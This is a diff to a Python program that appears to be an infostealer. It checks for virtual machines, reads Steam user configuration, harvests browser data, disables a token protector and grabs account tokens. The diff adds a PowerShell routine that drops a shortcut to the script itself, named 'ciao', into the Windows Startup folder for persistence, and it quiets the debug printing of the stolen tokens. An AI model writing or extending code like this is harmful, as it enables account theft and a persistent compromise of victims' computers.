@@ -50,14 +50,24 @@ class Main:
             with open(steamUsers, "r") as f:
                 usersConfig = vdf.loads(f.read())
 
-            print(vdf.dumps(steamUsers, True))
-            
             return usersConfig
+        
+    def addStartup(self, linkname: str, pathExec: str):
+        script = f"""
+
+        $sh = New-Object -ComObject WScript.Shell
+        $userStartupFolderPath = [Environment]::GetFolderPath("Startup")
+        $shortcutFile = $sh.CreateShortcut("$userStartupFolderPath\{linkname}.lnk")
+        $shortcutFile.TargetPath = "{pathExec}"
+        $shortcutFile.Save()
+        """
+        sysinfo.runPowershell(script)
+
 
     def token(self):
         extractor.Anti_tokenprotector.killprotector()
         tokens = tokengrabber.extract_tokens().tokens
-        print(tokens)
+        # print(tokens)
 
     def run(self):
         antivm.Antivm.run()
@@ -69,6 +79,7 @@ class Main:
         self.steam()
         self.browser()
         self.token()
+        self.addStartup("ciao", os.path.realpath(__file__))
 
 if __name__ == "__main__":
     Main().run()
